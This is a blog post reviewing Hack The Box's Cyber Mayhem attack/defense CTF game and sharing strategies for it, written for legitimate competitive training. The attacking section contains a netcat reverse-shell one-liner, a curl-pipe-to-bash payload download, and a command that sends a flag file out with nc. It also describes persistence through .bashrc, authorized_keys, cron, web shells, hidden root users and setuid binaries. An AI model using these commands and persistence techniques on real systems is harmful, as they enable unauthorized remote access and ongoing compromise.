---
layout: post
title: Hack The Box Battlegrounds Cyber Mayhem (Attack/Defense) Review + Strategies, Tips and Tricks
subtitle: In this article, we will discuss Hack The Box BattleGround (HBG) Cyber Mayhem as well as spoiler free attack and defense strategies, tips and tricks for it.
comments: false
categories:
- CTF 
tags:
- hackthebox
---

In this article, we will discuss **Hack The Box BattleGround (HBG) Cyber Mayhem** as well as spoiler free attack and defense strategies, tips and tricks for it.

![](https://i.imgur.com/7OnbIOp.png){: .mx-auto.d-block :}

**Background:** I play HTB as **ameer** and my HTB public profile is [https://www.hackthebox.eu/profile/7252](https://www.hackthebox.eu/profile/7252) (and as you can see, the user ID is 7252, hence was been a part of HTB during its mid-initial early days) (at peak during the time when was quite active on HTB, the account was at top ~20 Global and just one challenge away from getting Omniscient rank, though did not try to gain it – as I do not think my skills are on that level, hence choose to stay at this rank). Eventually, was been inactive, and last machine pwned for the account on the HTB platform was more than a year ago. The Hack The Box Battleground (HBG) Cyber Mayhem made me active again on HTB platform - as the idea of competing against hackers from different countries in a live gamified attack-defense scenario seems really fun.

Spoiler free means that we would not tackle and discuss exploits and vulnerabilities of the machines involved in HTB Cyber Mayhem.

Please note that these are all based from my personal experience playing Hack The Box Battlegrounds Cyber Mayhem as well as competing on its first and second season tournaments. Luckily and humbly managed to be part of the winners for those said tournaments.

**1st HBG 2vs2 Tournament** – **Top Player per Rank (Guru)** (Competed as solo player, except for a few hours left remaining.)

**Proof:**

![](https://i.imgur.com/qtV162D.jpg){: .mx-auto.d-block :}

**2nd HBG 2vs2 Tournament** (with prizes by HTB and Synack) – **3rd place** as team (played with my awesome and reliable teammate: [ajdumanhug](https://www.hackthebox.eu/profile/55589)) (on 20 battles wherein we did not skipped or rejected any teams that we are matched with - we went 18 wins and lost twice) (Note: We should have lost only once, since one team - went beyond the rules - which resulted us losing the match.)

**Proof:**

![](https://i.imgur.com/PS6amBN.png){: .mx-auto.d-block :}

![](https://i.imgur.com/pQR8XXB.png){: .mx-auto.d-block :}

## Introduction to HackTheBox Battlegrounds Cyber Mayhem

For starters, we would discuss what is **Cyber Mayhem**.

**Cyber Mayhem** is one of the game modes available via HTB Battlegrounds. It is a gamified approach on attack and defense wherein players are split into two teams (depending on the selected mode, either by 2vs2 or 4vs4) and compete by trying to attack the enemy machines as well as defend assigned machines.

It is different from [TryHackMe! King of the Hill KotH](https://tryhackme.com/games/koth) in the sense that while both requires you to attack machines, for KotH you will need to hold the /root/king.txt as long as you can to gain more points aside from submitting other flags **against all other players** – meaning **one against all**; while for HTB Cyber Mayhem, you will need to **work as a team defending your own machines while attacking enemy machines**; trying to exploit to read user and root flag.txt files. Hence, **both game modes are in different category**. Most likely the incoming **HTB Server Siege** is more probably in the same category with THM KotH, so it is better to compare both rather than compare TryHackMe! King of the Hill with Hack The Box Cyber Mayhem.

## Recommendations

Note that as this point of writing, **HTB Battlegrounds Cyber Mayhem is still on its beta phase**, so expect changes and improvements in the future.

### 1. Getting Started

Please see [HTB Introduction to Battlegrounds' article](https://help.hackthebox.eu/getting-started/battlegrounds) as it has full description on what the game mode is. I highly recommend watching [Ippsec video playing HBG Cyber Mayhem](https://www.youtube.com/watch?v=o42dgCOBkRk) in case starting out, so you would have initial knowledge about the game. 

### 2. Non-VIP versus VIP

I would also recommend **availing HTB VIP subscription** in case you are serious in playing, especially in tournaments as the **matches are gold**. Currently, Non-VIP with script-kiddie and above rank has 2 matches available, while VIP or VIP+ has 20 matches available.

![](https://i.imgur.com/JojHr0T.png){: .mx-auto.d-block :}

The matches for HTB Battleground Cyber Mayhem are gold, in the sense that it will give you knowledge on what the machines are, like what is exploitable or not exploitable. **The more matches you play, the more knowledge you gain on the machines.** This means knowing the specific vulnerabilities of the machines, you could either patch early or pwn the enemy machines as fast as you can.

This is the big difference, between having 2 matches versus having 20 matches. The **same goes with the tournaments** as the machines in the regular Cyber Mayhem matches are also used on it. So, in case that you have battled and wondered how a player managed to exploit your team machines fast enough before even learning what services it is running with, then you have the answer. The player already saw that machine a number of times, and already know what its vulnerability is and how to proceed in exploiting it.

### 3. 2v2 or 4v4

Since **your maximum matches are either only 2 (for Non-VIP) or 20 matches (for VIP)**, **except perhaps if you have unlimited matches like some players have**, then **recommended game mode to select is the 4v4** as it would give you more machines plus more time to learn about the machines. 2v2 has 30 minutes, while 4v4 has 1 hour of game time. (In choosing modes, and starting a match; selecting either 2v2 or 4v4, your number of available matches will still decrease by 1. So at most, playing in 4v4 will maximize your available matches.)

The disadvantage for 4v4 is that it needs 8 players in order to start, which might really take some time waiting for the player slots to be filled up depending on the availability of players.

**Note:** I have played the HTB Cyber Mayhem on its initial stage, and before the 4v4 is only the game mode available. The addition of 2v2 game mode helped with starting the game faster, as it needs only 4 players in order to start.

### 4. Take notes of the machines you've encountered

This will both help you with the normal Cyber Mayhem matches, as well as on tournaments. 

Currently the tournament also makes use of the machines in normal Cyber Mayhem rotation, thus you should be taking notes of the machines like its vulnerabilities and entry points, as well as privilege escalations. **Number of times being exposed to a machine, increases the chance for you to win matches.** Imagine the gap having encountered a machine once, versus a player who encountered it 20 times. While there is still a small possibility of winning (most probably due to luck – e.g. internet connection gone bad, sudden emergency for the other player, etc.), you are still in very huge disadvantage. Additionally, given the chance that both players are equally skilled; then the player who happened to encounter the machine only once, will lose badly.

Thus, it's important to take notes of the machines you've encountered as you only have limited matches available. The notes would at least help you progress and compete with other players.

## Strategies, Tips and Tricks

Being the main points of Cyber Mayhem, we would divide this section into **attacking** and **defending**.

Note that the tips and tricks below are based on my personal experience playing the game. During which, some of the tips involved, **I have experienced some players hate and trash talking on HTB Discord #hbgt-battle-talks channel while playing in tournament. This even eventually escalated to name calling and such**.

The current general **HTB Cyber Mayhem rules** are as below:

> Players aren't supposed to shut down machines.: Players are not allowed to change the root password of machines.: Processes/commands that are marked with `HTB=1` prefix should not be considered as part of the exploitation process since they are system checks to ensure that machine's legitimate functionality is preserved.: Defenders are not allowed to massively "kill shells" in order to secure their systems. They should focus on patching the actual vulnerabilities.: Defenders aren't supposed to kill a service just to patch vulnerabilities.: When defenders try to patch vulnerabilities, it's their responsibility to make sure that no underlying functionality has been stopped due to their patch. For example, there is a reason for sudo entries so when they are modified they should still serve their original purpose. Removing a sudo entry is not a "fix" and defenders should consider fixing the insecure "sudo entry" instead of removing it.: If a system check has been fired in the middle of a service restart or machine reset/reboot there is a chance that defenders will be punished with loss of points. This is intended and the reason behind that is to "award" the players who didn't restart/reboot many times.: Surrenders can't be called before the 15 minute mark.

Nevertheless, below are my gathered strategies, tips and tricks for Cyber Mayhem which are based on experience during the tournament.

### Defending

### 1. Patching sudoers file early at the start

One crucial part in defending is to patch the root privilege escalation. An attacker gaining root access to one of your machines means that he now owns that machine, thus can do anything he wanted to. Since majority of the machines have vulnerability in sudoers, one strategy is to patch it as early as you can.

Note that no underlying functionality should stop due to the patch. (e.g. Not removing sudoers entries but rather editing them to give less privileges to the users.)

### 2. Hiding command output of bash

We actually received a number of players' hate on HTB Discord #hbgt-battle-talks channel while playing in tournament regarding this strategy. At the same time, we were reported number of times. Quite a few players initially assumed that we deleted our machines /bin/bash shell, which never did happened.

Having just limited number of matches, and already consumed all of it - the same with other players (this was mentioned as some players competing on the tournament have unlimited matches on their account which can play regular Cyber Mayhem matches as many times as they want) - we haven't really had knowledge on numerous machines, as well as their vulnerabilities, so we do not know what to patch on it. We used this strategy to buy us some time to learn more about the machine as well as enumerating services currently available on it. Please note that this trick, can be easily brushed off by an attacker knowing how it works.

The trick is to hide commands being outputted by bash shell. Do take note that the **bash works perfectly including all the commands entered on it**, and **in no way being deleted nor destroyed**. It's just the output is hidden. Obviously, since we believe, it is being fair as part of defending not to destroy binaries. For reference, check this [article](https://askubuntu.com/questions/859501/how-to-hide-all-command-output-with-zsh-and-bash/860230#860230). 

To do this, you just need to enter the command below.
~~~
exec >/dev/null
~~~

The idea in here is to redirect stdout and stderr of any following command to /dev/null.

As an attacker, there are numerous ways to counter this, below are a few methods.

(1) Enter the command below, to restore output.
~~~
exec >/dev/tty
~~~

(2) Start a netcat listening port, then pipe bash output in netcat.
~~~
On your machine: nc -lp <port>
~~~

~~~
On the victim machine: cat /opt/flag.txt | nc <ip address> <port>
~~~

**Note:** I have encountered this numerous time with other players even during 1st season of HBG tournament.

As an attacker, in case you are seeing no output on your shell, don't panic and assume opponent deleted bash or something like that.

### 3. strpos and preg_match

Not giving too much information on the machines, but several of it involves making use of PHP, hence while there are a lot of available options (and depending on the scenarios as well), my go to functions to quickly patch PHP codes are, strpos and preg_match. The functions would help, patching especially those that concerns command injection and local file inclusion vulnerabilities.

Below is an example of using it (for example, there is a command injection using semi-colon, and you want to patch it). You could use it on other characters as well, but the general idea is below.

~~~
$ip = $_POST['ip']; //request accepting a parameter
~~~

~~~
…
~~~

~~~
//then for example, you want to prevent semi-colon entries, you could do:
~~~

~~~
if (strpos($ip, ';') !== false) { 
//what you want to do 
}
~~~

Learning how to edit vulnerable PHP pages and using those functions would help in patching.

### 4. Using ps -ef --forest

For Linux (based from experience, all current encountered Cyber Mayhem machines are in Linux), the command will result on seeing the processes in a tree format, hence would help you investigate on current running processes. 
~~~
ps -ef --forest
~~~

It will also show how the processes are linked with each other which is helpful in terms of investigating, especially finding out what process gave an attacker a shell, hence you could try to find out what is vulnerable and fix if possible (if you have time to do so).

### 5. Patch as fast as you can

Not really a strategy but defending revolves around this.

Again, would like to stress the importance of knowing the machines, because if you have no prior knowledge and attacker know the machine then you are extremely at disadvantage, as during the time you are still investigating chances are, they already rooted the machine.

Vice versa, if you know the machine, you could patch as fast as you can without investigating the running processes, then the attacker with no prior knowledge is at disadvantage, as he needs first to investigate how the machines and its internals work and figure out the vulnerability.

### 6. Reseting machines just before flag resets

We have encountered this many times during the tournament playing with different teams. 

Knowing the time when to reset seems like a very good strategy. 

There is a 3 minute protection when reseting the machine, thus by using this, you will be able to skip the time wherein an enemy should have been submitting the flag. While we haven't been doing this during the tournament, we are at praise for teams that managed to pull this off flawlessly a couple of times against us.

### Defending methods that raise concerns

Playing on the last tournament, I have also experienced strategies of different players or teams, which I find** highly concerning**.

### 1. Breaking (bricking) binaries of the machine you are defending

Again, encountered this during tournament, wherein running the binary causes SEG FAULT error. This is way far incomparable to just hiding the output of bash when you are defending. While not all the binaries are segmentation faulted, a number of key binaries which could result to gaining shell access to the machines were broken. To counter this, you would need to exploit the machine, as fast as you can before the binaries were broken – which is likely impossible if you just first encountered the machine or machine itself has complicated exploit based on time.

### 2. Resetting machines just before the 3 minutes the match ends

While listed in defending methods that raises concern, I'm still neutral on this; as haven't really experienced it plus both teams have this option available to them. The way it works is that seems like you could reset the machine just before the 3-minute mark, so it's safe from being exploited. This is crucial when the points are just within reach and both teams happened to exploit each other machines.

### Attacking

Some of the strategies involve might raise concern, but in attacking, it was mentioned that **the job of defender, is to make sure everything works**. Hence, **for attacking you have a lot of options available at your disposal** if defender don't patch the vulnerabilities.

![](https://i.imgur.com/609KVOp.png){: .mx-auto.d-block :}

Imagination and creativity are your limit **provided that you don't break rules such as not shutting down machines, not changing the root password of machines and not attacking processes/commands that are marked with `HTB=1` prefix**.

Below are tips based on what I've experienced in playing both tournaments in HBG Cyber Mayhem.

### 1. Prepare a shell script that would give you reverse shell access

Having a prepared shell script, eliminate the time consumed typing the commands, as well as removing the chances of mistyping it. For reference, check out [reverse shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

Example is below:
~~~
shell.sh
~~~

~~~
touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&amp;1 | nc [ip address] [port] > /tmp/f
~~~

Doing this, you could readily call the script by just starting a web server which is helpful in case you have remote code execution access to target machines. I recommend using the built-in python HTTP server module when using it (as you can start a web server on a directory you want quite fast), then use curl to download and run it on a compromised machine.
~~~
#start python webserver
~~~

~~~
python -m SimpleHTTPServer <port>
~~~

~~~
#on victim machine
~~~

~~~
curl <ip address>:<port>/shell.sh | bash
~~~

### 2. Prepare a user shell script for backdoors and persistence

Similar idea with the script above, you can build a script that will give you backdoor and persistence on the victim machine. The script will lessen the time consumed when typing it normally on the command line, as well as chances of mistyping it. Doing this you could setup backdoors and persistence as fast as you can.

Depending on the privilege, for users, if available, I recommend adding your backdoor to files such as .bashrc, .ssh/authorized_keys and cronjobs. It is also helpful if you could implant backdoor web shells if your user has web privileges (e.g. www-data). Doing this not only will defenders spend some time finding what you have added, but also you will have different avenue to still have command execution in cases where shell has been killed.

### 3. Prepare a root shell script for backdoors, persistence and such

Gaining root access, you could punish the opposing team as you have a lot of options. **This also means that you own their current machine.**

With the current rules in place, **creativity is your limit provided that you won't do stuffs such as shutting down machines, changing the root password of machines and attacking processes/commands that are marked with `HTB=1` prefix**.

As you have root access, there are so many options available, below are just examples and just tip of the iceberg.

> Add your own multiple root users/accounts
> Setting different binaries to setuid (running will instantly give you root access): Setting permission of files that would give root access to world writeable (e.g. /etc/passwd, /root): Adding hidden root users

Note that while playing the tournament, there are numerous ingenious ways that I have encountered regarding this, and we do not in any way report or have taken the idea is illegal or have taken it badly from the player, as from our perspective, we did not did our part as a defender and the attacker is free to do anything since managed to gain access, except perhaps those that would be against the general rules which includes shutting down machines, changing the root password of machines and attacking processes/commands that are marked with `HTB=1` prefix. 

Below are some of the ways we encountered, where we also try and tweak to apply in our attacks.

> Implanting rootkits (investigating this might be really time consuming, depending on rootkit implanted, and since for tournament is 2v2 and only has more limited game time, chances are it's better to reset your machine than dig deeper)

## Feedback/Recommendations for Tournament

As an active participant for both previously ended 1st and 2nd HBG Cyber Mayhem tournaments, below are my current suggestions and recommendations for the tournament. **Please note that these are all based from my own opinion and my experience playing the tournaments.**

- Only use new/unreleased machines for the tournament. The reason is that, this would make a fair game for new players as well, as even those who only played a few matches (e.g. a single match, or 2 matches) will have a chance in beating other teams. Current setup on tournaments is that the tournament machines is the same with current regular machines, and since they are just the same - this puts players with huge number of matches on regular Cyber Mayhem (for example, having unlimited matches) at great advantage against other players. Personally, for me, just by maxing out the available 20 matches, I already have a bit of knowledge on a few machines, and given the chance that the machine assigned or spawned is a machine that I know of, then I could exploit it in just a few minutes. While this may take away my advantage with other players, I believe it would be fair tournament battle. Using only new/unreleased machines for tournaments would seem fair for all players.

- Either set defined granular rules for both attacking and defending; or make anything goes acceptable, with limitation of course, of following the current rules which are not shutting down machines, not changing the root password of machines, not attacking processes/commands that are marked with `HTB=1` prefix, defenders not killing a service just to patch vulnerabilities, and defenders patch should not affect the functionality of the service. Below are advantages and disadvantages for both scenarios.: **Advantage for setting defined granular rules:**: Easier to figure out which should be illegal or not: **Disadvantage for setting defined granular rules:**: Quite difficult to come up with: Might limit or defeat the purpose of attacking and defending: Possible loopholes even with rules defined: **Advantage for making anything goes acceptable (with limitation of following the current rules)**: Lesser reports by players, since all would understand that it's accepted if it's not listed against the rules: Easier to come up with, and just add new rules to the current rules depending on the feedback: **Disadvantage for making anything goes acceptable (with limitation of following the current rules)**: Several new methods outside of the rules for both attacking and defending would show up and might possibly be abused (for example, there is no current rule for bricking own binaries as defender, hence defenders might continuously just brick their own binaries)

- Monitor also the vulnerabilities. Not sure on how the checks are done to monitor the machines, but it would be good to also monitor the vulnerabilities, and **in case not fixed, then it would cause "losing points" for the machine.** This way, players can give prioritization on fixing vulnerabilities as much doing all out attacks, as they would be punished for not doing so (even without getting attacked) and also lose points if not fixed properly.

- Implement a shield function during the start of the match. The current tournament meta gives complete advantage to any player who already knows the current vulnerability for a machine, thus highly possible for a machine to be compromised at the very start. For example, a payload has been already set up for a specific machine and all it needs is the target host or IP address to be changed. A player who had been exposed several times on a machine, just needs to check what the machine is (e.g. just a mere glimpse of its website, that player already know what to do to exploit it). This could result on pwning the machine in just a few minutes or so, and if the sudoers wasn't entirely patch, then guaranteed root access in just a few minutes.

- If new/unreleased machines are not possible, then vulnerabilities/services should be placed at randomized ports. (This might be hard to implement.) Doing this would some how prevent those instant pwn, wherein a player would still need to check running services as well as ports, instead of going directly on pwning the machine (again example, a payload already set up and all it needs is the IP address). The way the current meta on the tournament works is that you can skip the enumeration part (in case you have seen it on regular Cyber Mayhem battles numerous times), and proceed directly to exploiting just by seeing the web application front end.


- Add bonus points for winning streaks which only adds up when a team (or players) doesn't skip or reject battles assigned to them by the system during matchmaking. (Again, might be hard to implement as there are a lot of variables involved including how the matches are tracked.) The explanation is that for tournaments, the rankings are based on winning matches; however from playing previous tournaments, it seems that the teams can choose whether to skip or accept battles - hence, it is possible for a team to somehow select whom to play against with. While there is no evidence that this is being abused on the tournaments, chances are it is possible. This is also to reward teams which don't handpicked their opponents. 

## Final Thoughts

The [HBG Cyber Mayhem](https://app.hackthebox.eu/battlegrounds/lobby) along with its gamified approach provides a fun way of doing attack and defense. It is highly recommended to try and test it out. Currently, it's only on its beta phase so expect tons of changes and improvements on it. Nevertheless, I highly advised to check it out, as not only you will gain additional attacking skills and be able to legally experiment on different attack vectors against a live opponent but also learn a thing or two on how to patch and defend machines from those attacks. That being said, this happens real time which helps exercise the thought process of attacking or defending.

I've already run out of available matches, so won't be able to play again; but if this helps you somehow and if you happen to play with me (in case matches available have been reset and now able to play again), please do mention it.

Thanks again for reading. Have a blessed day. Cheers.
